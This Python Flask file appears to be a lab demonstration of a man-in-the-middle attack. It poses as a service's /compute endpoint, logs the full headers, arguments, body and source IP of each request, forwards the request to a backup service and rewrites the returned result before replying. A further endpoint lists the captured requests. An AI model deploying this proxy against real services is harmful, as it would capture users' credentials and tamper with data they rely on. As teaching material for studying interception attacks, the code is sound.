from flask import Flask, request, jsonify
import requests
import json
import logging
import time

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Store intercepted data
intercepted_requests = []

@app.route('/compute', methods=['GET', 'POST'])
def mitm_compute():
    """Intercept requests to flask-app-2's /compute endpoint"""
    
    # Log the intercepted request
    intercepted_data = {
        'timestamp': time.time(),
        'method': request.method,
        'headers': dict(request.headers),
        'args': dict(request.args),
        'data': request.get_data(as_text=True),
        'source_ip': request.environ.get('REMOTE_ADDR')
    }
    
    intercepted_requests.append(intercepted_data)
    
    print(f"🚨 MITM ATTACK: Intercepted request!")
    print(f"🚨 Source: {request.environ.get('REMOTE_ADDR')}")
    print(f"🚨 Headers: {dict(request.headers)}")
    print("-" * 50)
    
    # Forward to real flask-app-2, but modify the response
    try:
        real_response = requests.get("http://flask-app-2-backup:5001/compute")
        original_data = real_response.json()
        
        # Demonstrate data manipulation
        modified_data = original_data.copy()
        modified_data["result"] = 999  # Change from 42 to 999
        modified_data["mitm_injected"] = "⚠️ THIS RESPONSE WAS MODIFIED BY MITM ATTACK!"
        modified_data["original_result"] = original_data["result"]
        
        print(f"🚨 MITM: Original response: {original_data}")
        print(f"🚨 MITM: Modified response: {modified_data}")
        print("=" * 50)
        
        return jsonify(modified_data)
        
    except Exception as e:
        print(f"🚨 MITM: Error forwarding request: {str(e)}")
        # Return fake data if real service is down
        return jsonify({
            "result": 666, 
            "error": "Real service unreachable",
            "mitm_message": "🚨 This is a completely FAKE response from MITM!"
        })

@app.route('/intercepted')
def show_intercepted():
    """Show all intercepted requests for demonstration"""
    return jsonify({
        "total_intercepted": len(intercepted_requests),
        "message": "🚨 These requests were intercepted by MITM attack!",
        "requests": intercepted_requests[-10:]  # Show last 10
    })

@app.route('/')
def home():
    return "🚨 MITM Proxy is running and intercepting traffic!"

@app.route('/health')
def health():
    return jsonify({"status": "MITM proxy healthy"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)